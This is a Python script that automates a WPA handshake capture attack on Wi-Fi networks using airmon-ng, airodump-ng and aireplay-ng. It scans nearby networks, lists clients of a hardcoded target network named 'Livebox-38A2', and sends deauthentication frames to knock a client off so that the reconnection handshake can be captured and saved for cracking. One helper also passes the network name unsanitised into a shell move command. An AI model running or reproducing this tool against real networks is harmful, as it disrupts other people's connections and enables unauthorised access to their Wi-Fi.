#!/usr/bin/env python
#tGcaHS7eXfZGsRViSw

import logging
import CSVHelper
import ScriptUtils
import XMLHelper
import JSONHelper

#run airmon and get network card name
def getNetworkCard():
    p = ScriptUtils.commandAsRoot("airmon-ng")
    return p[0].split()[5]

#run airmon start
def startMonitoring():
    network_card = getNetworkCard()
    p = ScriptUtils.commandAsRoot("airmon-ng start %s" % network_card)
    return network_card + "mon"

#reset
def reset():
    ScriptUtils.stopInterface()
    ScriptUtils.rmOutputs()

#run airodump who extract resut into airodump-01.kismet.csv
def getAllWifi(monitoring):
    command = "timeout 5 airodump-ng -w airodump --output-format kismet %s" % monitoring
    return ScriptUtils.commandAsRootWithTimeout(command, 6)

#analyze network to see all devices into the network
def analyzeNetwork(n, monitoring):
    command = "timeout 20 airodump-ng -c %s --bssid %s -w ../output/ %s" % (n['channel'],n['bssid'],monitoring)
    return ScriptUtils.commandAsRootWithTimeout(command, 21)

#get network from essid
def getNetworkByESSID(networks, essid):
    for n in networks:
        if n.essid == essid:
            return n 

#get handshake thanks to client
def getHandshake(network, client, monitoring):
    command = "timeout 20 aireplay-ng -0 2 -a %s -c %s %s" % (network['bssid'],client['mac'],monitoring)
    return ScriptUtils.commandAsRootWithTimeout(command,21)

#mv @handshake to @location
def mvHandshake(handshake, location):
    command = "mv "+handshake+" "+location
    return ScriptUtils.command(command)

#-----STEP 1------

#get networks
def testGetNetworks():
    monitoring = startMonitoring()
    getAllWifi(monitoring)
    networks = CSVHelper.parseCSV("airodump-01.kismet.csv")
    
    return networks, monitoring

def getNetworks():
    monitoring = startMonitoring()
    getAllWifi(monitoring)
    networks = CSVHelper.parseCSV("airodump-01.kismet.csv")
    reset()

    return JSONHelper.dumpListObject(networks)

#-----STEP 2------
#Need test on multiple devices connected

#get networks
def testGetDevices(network, monitoring):
    network = JSONHelper.loadObject(network)
    analyzeNetwork(network,monitoring)
    client = XMLHelper.getClientMac("../output/-01.kismet.netxml")
    
    return client

def getDevices(network):
    monitoring = startMonitoring()

    network = JSONHelper.loadObject(network)
    analyzeNetwork(network,monitoring)
    client = XMLHelper.getClientMac("../output/-01.kismet.netxml")

    reset()
    return JSONHelper.dumpObject(client)
    

#-----STEP 3-----#
#Get Handshake
def testGetAndMoveHandshake(network,client,monitoring):
    network = JSONHelper.loadObject(network)
    client = JSONHelper.loadObject(client)
    getHandshake(network,client,monitoring)
    mvHandshake("../output/-01.cap","./"+network['essid']+".cap")

def getAndMoveHandshake(network,client):
    monitoring = startMonitoring()

    network = JSONHelper.loadObject(network)
    client = JSONHelper.loadObject(client)
    getHandshake(network,client,monitoring)
    mvHandshake("../output/-01.cap","./"+network['essid']+".cap")

    reset()
    return JSONHelper.dumpObject(client)


def main():
    networks, monitoring = testGetNetworks()
    
    essid = "Livebox-38A2"
    network = getNetworkByESSID(networks,essid)
    clients = testGetDevices(JSONHelper.dumpObject(network), monitoring)
    
    if clients == -1:
        return 0

    for client in clients:
        print(client)

    testGetAndMoveHandshake(JSONHelper.dumpObject(network), JSONHelper.dumpObject(clients[0]), monitoring)

    '''
    network_card = getNetworkCard()
    monitoring = startMonitoring(network_card)
    getAllWifi(monitoring)
    networks = CSVHelper.parseCSV("airodump-01.kismet.csv")
    essid = "Livebox-38A2"
    network = getNetworkByESSID(networks,essid)
    analyzeNetwork(network,monitoring)
    client = XMLHelper.getClientMac("../output/-01.kismet.netxml")
    if client != "":
        print(client)
        getHandshake(network, client, monitoring)
        mvHandshake("../output/-01.cap","./"+essid+".cap")
    '''

if __name__ == "__main__":
    logging.basicConfig(format='%(asctime)s %(levelname)s:%(message)s',filename='script.log',filemode='w',level=logging.DEBUG)
    main()
    #reset()